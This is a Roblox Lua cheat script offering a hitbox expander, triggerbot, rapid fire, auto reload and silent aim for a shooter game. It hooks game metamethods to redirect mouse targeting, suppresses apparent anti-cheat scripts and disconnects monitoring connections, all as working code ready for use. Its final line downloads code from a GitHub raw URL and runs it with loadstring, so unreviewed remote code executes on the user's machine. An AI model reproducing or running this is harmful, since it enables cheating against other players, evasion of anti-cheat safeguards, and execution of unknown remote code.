-- Instant Hitbox Expander with Toggle + Triggerbot + Silent Aim
-- Press T or click button to toggle hitbox
-- Press Y or click button to toggle triggerbot
-- Silent Aim automatically enabled if configured

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Camera = workspace.CurrentCamera

-- Configuration (reads from _G.hitboxConfig or uses defaults)
local config = _G.hitboxConfig or {
    hitboxSize = 25,
    hitboxTransparency = 0.3,
    hitboxColor = Color3.fromRGB(1, 97, 121),
    outlineColor = Color3.fromRGB(255, 255, 255),
    hitboxKey = "T",
    triggerKey = "Y",
    rapidFireKey = "P",
    rapidFireRate = 0.05,
    autoReload = true,
    reloadAtAmmo = 0,
    silentAim = true,
    autoShoot = false,
    hitPart = "Head",
    maxDistance = 200,
    allowKnocked = false
}

-- Toggle states
local hitboxEnabled = false
local triggerEnabled = false
local rapidFireEnabled = false
local silentAimEnabled = config.silentAim
local autoShootEnabled = config.autoShoot

-- Store original sizes
local originalSizes = {}
local selectionBoxes = {}

-- Triggerbot cooldown
local lastTriggerTime = 0
local triggerCooldown = 0  -- 1ms between shots (ultra fast)
local isHoldingTrigger = false

-- Rapid fire variables
local rapidFireRate = config.rapidFireRate
local isFiring = false
local lastRapidShot = 0

-- Auto reload variables
local autoReloadEnabled = config.autoReload
local reloadAtAmmo = config.reloadAtAmmo
local lastReload = 0
local reloadCooldown = 0.5

-- Silent Aim variables
local LastPart, LastPlayer
local MainEvent = ReplicatedStorage:FindFirstChild("MainEvent")

-- Raycast parameters for Silent Aim
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Root = Character:WaitForChild("HumanoidRootPart")

local Params = RaycastParams.new()
Params.FilterDescendantsInstances = {Character, workspace:FindFirstChild("Vehicles")}
Params.FilterType = Enum.RaycastFilterType.Blacklist

-- Function to check if player is knocked out
local function IsKOED(Char)
    local Effects = Char and Char:FindFirstChild("BodyEffects")
    if not Effects then return true end
    local KO, Dead = Effects:FindFirstChild("K.O"), Effects:FindFirstChild("Dead")
    return KO and KO.Value or Dead and Dead.Value
end

-- Function to get closest player for Silent Aim
local function GetClosestPlayerSilentAim(Position, MaxDistance)
    local ClosestPart, ClosestPlayer, FinalRay
    local ClosestDistance = MaxDistance or config.maxDistance
    
    local PlayersList = Players:GetPlayers()
    table.remove(PlayersList, table.find(PlayersList, LocalPlayer))
    
    for _, Player in pairs(PlayersList) do
        local Char = Player.Character
        local Part = Char and Char:FindFirstChild(config.hitPart)
        
        if not Part or (not config.allowKnocked and IsKOED(Char)) then continue end
        
        local Direction = (Part.Position - Position)
        local Distance = Direction.magnitude
        
        if ClosestDistance > Distance then
            local ray = workspace:Raycast(Position, Direction.Unit * Direction.Magnitude, Params)
            
            if ray and ray.Instance:IsDescendantOf(Char) then
                ClosestPart, ClosestPlayer, ClosestDistance, FinalRay = Part, Player, Distance, ray
            end
        end
    end
    
    return ClosestPart, ClosestPlayer, FinalRay
end

-- Automatic weapons that should hold instead of click
local automaticWeapons = {
    ["[SMG]"] = true,
    ["[AR]"] = true,
    ["[P90]"] = true,
    ["[SilencerAR]"] = true,
    ["[AK47]"] = true,
    ["[Flamethrower]"] = true,
    ["[AUG]"] = true,
    ["[LMG]"] = true,
    ["[Drum-Shotgun]"] = true
}

-- Function to get the closest part for Silent Aim (caches last target)
local function GetClosestPart(MHit)
    local Hit = MHit.Position
    if LastPart then
        local Ray = workspace:Raycast(Hit, (Hit - LastPart.Position).Unit * 200, Params)
        if not Ray or not Ray.Instance:IsDescendantOf(LastPart.Parent) or (LastPlayer and not config.allowKnocked and IsKOED(LastPlayer.Character)) then
            LastPart = nil
        end
    end
    
    if not LastPart then
        LastPart, LastPlayer = GetClosestPlayerSilentAim(Hit)
    end
    
    return LastPart
end

-- Silent Aim metamethod hooks
local OriginalIndex, OriginalNewIndex, OriginalNamecall
local Getmetatable = getmetatable

local function IsTrap(a)
    local mt = typeof(a) == "table" and Getmetatable(a)
    return mt and mt.__tostring
end

if silentAimEnabled then
    OriginalIndex = hookmetamethod(game, "__index", newcclosure(function(Self, Key)
        local Hit = OriginalIndex(Self, Key)
        
        if Self == game and (not Key or IsTrap(Key)) then return error("missing argument #2 (string expected)") end
        if not Self then error("invalid argument #1 (Instance expected, got nil)") end
        if not Key then error("invalid argument #2 (string expected, got nil)") end
        
        if not getCurrentTool() or Self ~= Mouse or not silentAimEnabled then return Hit end
        
        if Key == "Hit" then
            local TargetPart = GetClosestPart(Hit)
            
            if TargetPart then
                return TargetPart.CFrame
            end
        elseif Key == "Target" then
            return LastPart or GetClosestPart(OriginalIndex(Self, "Hit"))
        end
        
        return Hit
    end))
    
    OriginalNewIndex = hookmetamethod(game, "__newindex", newcclosure(function(Self, Key, Value)
        if Self == game and (not Key and not Value or IsTrap(Key)) then return error("missing argument #2 (string expected)") end
        if not Self then error("invalid argument #1 (Instance expected, got nil)") end
        if not Key then error("invalid argument #2 (string expected, got nil)") end
        
        local src = getcallingscript()
        local IsAC = src and not src.Parent and src.Name ~= "ChatMain" and src.Name ~= "CameraModule" and src.Name ~= "ControlModule" and not checkcaller()
        
        if IsAC then return end
        
        return OriginalNewIndex(Self, Key, Value)
    end))
    
    OriginalNamecall = hookmetamethod(game, "__namecall", newcclosure(function(Self, ...)
        local Method = getnamecallmethod()
        if Self == game and (not Method or IsTrap(...)) then return error("Trying to call Method on object of type: DataModel with incorrect arguments.") end
        
        local src = getcallingscript()
        local IsAC = src and not src.Parent and src.Name ~= "ChatMain" and src.Name ~= "CameraModule" and not checkcaller()
        
        if IsAC then
            if Method == "FindService" then return end
            if not Method then error("invalid argument #1 (Instance expected, got nil)") end
        end
        
        return OriginalNamecall(Self, ...)
    end))
end

-- Create UI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HitboxToggleUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local hitboxButton = Instance.new("TextButton")
hitboxButton.Size = UDim2.new(0, 120, 0, 40)
hitboxButton.Position = UDim2.new(1, -130, 0, 10)  -- Top right
hitboxButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
hitboxButton.BorderSizePixel = 2
hitboxButton.BorderColor3 = Color3.fromRGB(0, 0, 255)
hitboxButton.Text = "Hitbox: OFF"
hitboxButton.TextColor3 = Color3.fromRGB(255, 255, 255)
hitboxButton.TextSize = 14
hitboxButton.Font = Enum.Font.GothamBold
hitboxButton.Parent = screenGui

local triggerButton = Instance.new("TextButton")
triggerButton.Size = UDim2.new(0, 120, 0, 40)
triggerButton.Position = UDim2.new(1, -130, 0, 55)  -- Below hitbox button, top right
triggerButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
triggerButton.BorderSizePixel = 2
triggerButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
triggerButton.Text = "Trigger: OFF"
triggerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
triggerButton.TextSize = 14
triggerButton.Font = Enum.Font.GothamBold
triggerButton.Parent = screenGui

local rapidButton = Instance.new("TextButton")
rapidButton.Size = UDim2.new(0, 120, 0, 40)
rapidButton.Position = UDim2.new(1, -130, 0, 100)  -- Below trigger button, top right
rapidButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
rapidButton.BorderSizePixel = 2
rapidButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
rapidButton.Text = "Rapid: OFF"
rapidButton.TextColor3 = Color3.fromRGB(255, 255, 255)
rapidButton.TextSize = 14
rapidButton.Font = Enum.Font.GothamBold
rapidButton.Parent = screenGui

local corner1 = Instance.new("UICorner")
corner1.CornerRadius = UDim.new(0, 6)
corner1.Parent = hitboxButton

local corner2 = Instance.new("UICorner")
corner2.CornerRadius = UDim.new(0, 6)
corner2.Parent = triggerButton

local corner3 = Instance.new("UICorner")
corner3.CornerRadius = UDim.new(0, 6)
corner3.Parent = rapidButton

-- Function to expand hitbox
local function expandPlayerHitbox(player)
    if player == LocalPlayer then return end
    
    local character = player.Character
    if not character then return end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        local playerId = tostring(player.UserId)
        
        if not originalSizes[playerId] then
            originalSizes[playerId] = humanoidRootPart.Size
        end
        
        humanoidRootPart.Size = Vector3.new(config.hitboxSize, config.hitboxSize, config.hitboxSize)
        humanoidRootPart.Transparency = 1
        humanoidRootPart.CanCollide = false
        humanoidRootPart.CanTouch = false
        humanoidRootPart.Material = Enum.Material.ForceField
        humanoidRootPart.Color = config.hitboxColor
        
        -- Use Highlight instead of SelectionBox (prevents chat UI interference)
        if not selectionBoxes[playerId] then
            local highlight = Instance.new("Highlight")
            highlight.Adornee = humanoidRootPart
            highlight.FillTransparency = 1 -- invisible inside
            highlight.OutlineTransparency = 0
            highlight.OutlineColor = config.outlineColor
            highlight.Parent = humanoidRootPart
            selectionBoxes[playerId] = highlight
        end
    end
end

-- Function to restore hitbox
local function restorePlayerHitbox(player)
    if player == LocalPlayer then return end
    
    local character = player.Character
    if not character then return end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        local playerId = tostring(player.UserId)
        
        if originalSizes[playerId] then
            humanoidRootPart.Size = originalSizes[playerId]
            humanoidRootPart.Transparency = 1
            humanoidRootPart.CanCollide = false
            humanoidRootPart.Material = Enum.Material.Plastic
        end
        
        if selectionBoxes[playerId] then
            selectionBoxes[playerId]:Destroy()
            selectionBoxes[playerId] = nil
        end
    end
end

-- Function to check if target is enemy
local function isEnemy(target)
    if not target then return false end
    
    local player = Players:GetPlayerFromCharacter(target.Parent)
    if not player then return false end
    if player == LocalPlayer then return false end
    
    local character = player.Character
    if not character then return false end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Health <= 0 then return false end
    
    return true
end

-- Function to get mouse target
local function getMouseTarget()
    local target = Mouse.Target
    if not target then return nil end
    
    -- Check if it's a player part
    if target.Parent and target.Parent:FindFirstChildOfClass("Humanoid") then
        return target
    end
    
    return nil
end

-- Function to check if target is visible (not behind wall)
local function isTargetVisible(target)
    if not target then return false end
    
    local character = LocalPlayer.Character
    if not character then return false end
    
    local head = character:FindFirstChild("Head")
    if not head then return false end
    
    -- Create raycast parameters
    local rayParams = RaycastParams.new()
    rayParams.FilterDescendantsInstances = {character, workspace.Ignored}
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
    rayParams.IgnoreWater = true
    
    -- Get target position
    local targetPos = target.Position
    local origin = head.Position
    local direction = (targetPos - origin)
    
    -- Perform raycast
    local rayResult = workspace:Raycast(origin, direction, rayParams)
    
    -- Check if we hit the target or nothing (clear shot)
    if not rayResult then
        return true -- No obstruction
    end
    
    -- Check if we hit the target player
    if rayResult.Instance then
        local hitParent = rayResult.Instance.Parent
        if hitParent and hitParent:FindFirstChildOfClass("Humanoid") then
            -- We hit a player, check if it's our target
            if rayResult.Instance == target or hitParent == target.Parent then
                return true
            end
        end
    end
    
    return false -- Hit a wall or other obstacle
end

-- Weapon names from the game's system
local weaponNames = {
    "[Glock]", "[Silencer]", "[Shotgun]", "[Rifle]", "[SMG]", "[AR]",
    "[RPG]", "[GrenadeLauncher]", "[P90]", "[SilencerAR]", "[Revolver]",
    "[AK47]", "[TacticalShotgun]", "[DrumGun]", "[Flamethrower]",
    "[AUG]", "[LMG]", "[Double-Barrel SG]", "[Drum-Shotgun]", "[Flintlock]"
}

-- Function to get current weapon (custom game system)
local function getCurrentTool()
    local character = LocalPlayer.Character
    if not character then return nil end
    
    -- Check for standard tool
    for _, child in pairs(character:GetChildren()) do
        if child:IsA("Tool") then
            return child
        end
    end
    
    -- Check for custom weapons (game-specific)
    for _, weaponName in pairs(weaponNames) do
        local weapon = character:FindFirstChild(weaponName)
        if weapon then
            return weapon
        end
    end
    
    return nil
end

-- Function to check if weapon is automatic
local function isAutomaticWeapon(tool)
    if not tool then return false end
    
    for weaponName, _ in pairs(automaticWeapons) do
        if tool:FindFirstChild(weaponName) or tool.Name == weaponName then
            return true
        end
    end
    
    return false
end

-- Function to hold trigger (for automatic weapons)
local function holdTrigger()
    if isHoldingTrigger then return end
    
    isHoldingTrigger = true
    local tool = getCurrentTool()
    
    if tool then
        -- Activate and hold
        pcall(function()
            tool:Activate()
        end)
        
        -- Hold mouse button
        pcall(function()
            mouse1press()
        end)
    end
end

-- Function to release trigger
local function releaseTrigger()
    if not isHoldingTrigger then return end
    
    isHoldingTrigger = false
    local tool = getCurrentTool()
    
    if tool then
        -- Deactivate
        pcall(function()
            tool:Deactivate()
        end)
        
        -- Release mouse button
        pcall(function()
            mouse1release()
        end)
    end
end

-- Function to simulate click (for semi-automatic weapons)
local function triggerClick()
    local currentTime = tick()
    if currentTime - lastTriggerTime < triggerCooldown then
        return
    end
    lastTriggerTime = currentTime
    
    local tool = getCurrentTool()
    
    if tool then
        -- Method 1: Properly activate the tool (triggers Tool.Activated event)
        pcall(function()
            tool:Activate()
        end)
        
        -- Wait a tiny bit then deactivate
        task.wait(0.01)
        
        pcall(function()
            tool:Deactivate()
        end)
    end
    
    -- Method 2: Mouse simulation for games that need it
    pcall(function()
        mouse1press()
        task.wait(0.01)
        mouse1release()
    end)
end

-- Toggle hitbox function
local function toggleHitbox()
    hitboxEnabled = not hitboxEnabled
    
    if hitboxEnabled then
        hitboxButton.Text = "Hitbox: ON"
        hitboxButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
        print("Hitbox Expander enabled!")
    else
        hitboxButton.Text = "Hitbox: OFF"
        hitboxButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        print("Hitbox Expander disabled!")
        -- Restore all hitboxes
        for _, player in pairs(Players:GetPlayers()) do
            restorePlayerHitbox(player)
        end
    end
end

-- Toggle triggerbot function
local function toggleTrigger()
    triggerEnabled = not triggerEnabled
    
    if triggerEnabled then
        triggerButton.Text = "Trigger: ON"
        triggerButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
        triggerButton.BorderColor3 = Color3.fromRGB(0, 255, 0)
        print("Triggerbot enabled!")
    else
        triggerButton.Text = "Trigger: OFF"
        triggerButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        triggerButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
        print("Triggerbot disabled!")
        
        -- Release trigger if it was holding
        if isHoldingTrigger then
            releaseTrigger()
        end
    end
end

-- Toggle rapid fire function
local function toggleRapidFire()
    rapidFireEnabled = not rapidFireEnabled
    
    if rapidFireEnabled then
        rapidButton.Text = "Rapid: ON"
        rapidButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
        rapidButton.BorderColor3 = Color3.fromRGB(0, 255, 0)
        print("Rapid Fire enabled!")
    else
        rapidButton.Text = "Rapid: OFF"
        rapidButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        rapidButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
        isFiring = false
        print("Rapid Fire disabled!")
    end
end

-- Function to fire weapon rapidly
local function fireWeaponRapid()
    local currentTime = tick()
    if currentTime - lastRapidShot < rapidFireRate then
        return
    end
    lastRapidShot = currentTime
    
    local tool = getCurrentTool()
    if not tool then return end
    
    -- Method 1: Find and fire RemoteEvent
    pcall(function()
        local remoteEvent = tool:FindFirstChild("RemoteEvent", true)
        if remoteEvent and remoteEvent:IsA("RemoteEvent") then
            remoteEvent:FireServer("Shoot")
        end
    end)
    
    -- Method 2: Activate tool
    pcall(function()
        tool:Activate()
    end)
end

-- Function to get ammo from tool
local function getAmmo(tool)
    if not tool then return nil, nil end
    
    -- Method 1: Check for Ammo IntValue
    local ammo = tool:FindFirstChild("Ammo")
    if ammo and ammo:IsA("IntValue") then
        return ammo.Value, ammo
    end
    
    -- Method 2: Check for Ammo NumberValue
    if ammo and ammo:IsA("NumberValue") then
        return ammo.Value, ammo
    end
    
    -- Method 3: Check in tool's children recursively
    for _, child in pairs(tool:GetDescendants()) do
        if child.Name == "Ammo" and (child:IsA("IntValue") or child:IsA("NumberValue")) then
            return child.Value, child
        end
    end
    
    return nil, nil
end

-- Function to reload weapon
local function reloadWeapon()
    local currentTime = tick()
    if currentTime - lastReload < reloadCooldown then
        return false
    end
    lastReload = currentTime
    
    local tool = getCurrentTool()
    if not tool then return false end
    
    -- Method 1: Press R key
    pcall(function()
        local vim = game:GetService("VirtualInputManager")
        vim:SendKeyEvent(true, Enum.KeyCode.R, false, game)
        task.wait(0.05)
        vim:SendKeyEvent(false, Enum.KeyCode.R, false, game)
    end)
    
    -- Method 2: Fire reload remote if it exists
    pcall(function()
        local reloadRemote = tool:FindFirstChild("RemoteEvent", true)
        if reloadRemote and reloadRemote:IsA("RemoteEvent") then
            reloadRemote:FireServer("Reload")
        end
    end)
    
    return true
end

-- Button click handlers
hitboxButton.MouseButton1Click:Connect(toggleHitbox)
triggerButton.MouseButton1Click:Connect(toggleTrigger)
rapidButton.MouseButton1Click:Connect(toggleRapidFire)

-- Keyboard input handlers
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode[config.hitboxKey] then
        toggleHitbox()
    elseif input.KeyCode == Enum.KeyCode[config.triggerKey] then
        toggleTrigger()
    elseif input.KeyCode == Enum.KeyCode[config.rapidFireKey] then
        toggleRapidFire()
    end
    
    -- Rapid fire mouse input
    if not gameProcessed and rapidFireEnabled and input.UserInputType == Enum.UserInputType.MouseButton1 then
        isFiring = true
    end
end)

-- Mouse release handler for rapid fire
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isFiring = false
        
        -- Deactivate tool to stop shooting
        local tool = getCurrentTool()
        if tool then
            pcall(function()
                tool:Deactivate()
            end)
        end
    end
end)

-- Rapid fire loop
RunService.RenderStepped:Connect(function()
    if not rapidFireEnabled or not isFiring then return end
    
    local tool = getCurrentTool()
    if not tool then return end
    
    fireWeaponRapid()
end)

-- Auto reload loop
RunService.RenderStepped:Connect(function()
    if not autoReloadEnabled then return end
    
    local tool = getCurrentTool()
    if not tool then return end
    
    local ammoValue, ammoObject = getAmmo(tool)
    
    -- Only reload when ammo is at or below the threshold
    if ammoValue and ammoValue <= reloadAtAmmo then
        reloadWeapon()
    end
end)

-- Keep hitboxes expanded when enabled
RunService.Heartbeat:Connect(function()
    if hitboxEnabled then
        for _, player in pairs(Players:GetPlayers()) do
            expandPlayerHitbox(player)
        end
    end
end)

-- Triggerbot loop
RunService.RenderStepped:Connect(function()
    if not triggerEnabled then
        -- Release trigger if disabled
        if isHoldingTrigger then
            releaseTrigger()
        end
        return
    end
    
    -- Check if player has a tool equipped
    local tool = getCurrentTool()
    if not tool then
        -- Release trigger if no tool
        if isHoldingTrigger then
            releaseTrigger()
        end
        return
    end
    
    local target = getMouseTarget()
    
    -- Check if we should shoot
    -- If hitbox expander is enabled, skip wall check (expanded hitbox can be hit through walls)
    local canShoot = false
    if target and isEnemy(target) then
        if hitboxEnabled then
            -- Hitbox expander is on, shoot regardless of walls
            canShoot = true
        else
            -- Hitbox expander is off, check for walls
            canShoot = isTargetVisible(target)
        end
    end
    
    if canShoot then
        -- Check if weapon is automatic
        if isAutomaticWeapon(tool) then
            -- Hold trigger for automatic weapons
            holdTrigger()
        else
            -- Click for semi-automatic weapons
            triggerClick()
        end
    else
        -- No valid target, release trigger if holding
        if isHoldingTrigger then
            releaseTrigger()
        end
    end
end)

-- Additional bypass when enabled
RunService.Heartbeat:Connect(function()
    if hitboxEnabled then
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = player.Character.HumanoidRootPart
                -- Try to disconnect monitoring connections
                pcall(function()
                    local connections = getconnections(hrp.Changed)
                    for _, connection in pairs(connections) do
                        connection:Disconnect()
                    end
                end)
            end
        end
    end
end)

-- Handle new players joining
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        wait(0.5)
        if hitboxEnabled then
            expandPlayerHitbox(player)
        end
    end)
end)

-- Handle player respawning
for _, player in pairs(Players:GetPlayers()) do
    player.CharacterAdded:Connect(function()
        wait(0.5)
        if hitboxEnabled then
            expandPlayerHitbox(player)
        end
    end)
end

-- Clean up when players leave
Players.PlayerRemoving:Connect(function(player)
    local playerId = tostring(player.UserId)
    originalSizes[playerId] = nil
    if selectionBoxes[playerId] then
        selectionBoxes[playerId]:Destroy()
        selectionBoxes[playerId] = nil
    end
end)

-- Auto Shoot loop (Silent Aim)
RunService.RenderStepped:Connect(function()
    if not autoShootEnabled or not silentAimEnabled then return end
    
    local tool = getCurrentTool()
    if not tool then return end
    
    local targetPart = GetClosestPart(Mouse.Hit)
    
    if targetPart then
        -- Shoot at the target
        pcall(function()
            tool:Activate()
        end)
        
        pcall(function()
            mouse1click()
        end)
    end
end)

-- Update character on respawn
LocalPlayer.CharacterAdded:Connect(function(NewChar)
    Character = NewChar
    Root = Character:WaitForChild("HumanoidRootPart")
    Params.FilterDescendantsInstances = {Character, workspace:FindFirstChild("Vehicles")}
end)

print("Hitbox Expander + Triggerbot + Rapid Fire + Auto Reload + Silent Aim loaded!")
print("Press " .. config.hitboxKey .. " to toggle hitbox")
print("Press " .. config.triggerKey .. " to toggle triggerbot")
print("Press " .. config.rapidFireKey .. " to toggle rapid fire")
if autoReloadEnabled then
    print("Auto Reload: ENABLED (reloads at " .. reloadAtAmmo .. " ammo)")
else
    print("Auto Reload: DISABLED")
end
if silentAimEnabled then
    print("Silent Aim: ENABLED (Target: " .. config.hitPart .. ", Max Distance: " .. config.maxDistance .. ")")
else
    print("Silent Aim: DISABLED")
end
if autoShootEnabled then
    print("Auto Shoot: ENABLED")
else
    print("Auto Shoot: DISABLED")
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/vejuxas/hitbox-expander/refs/heads/main/aaaa"))()
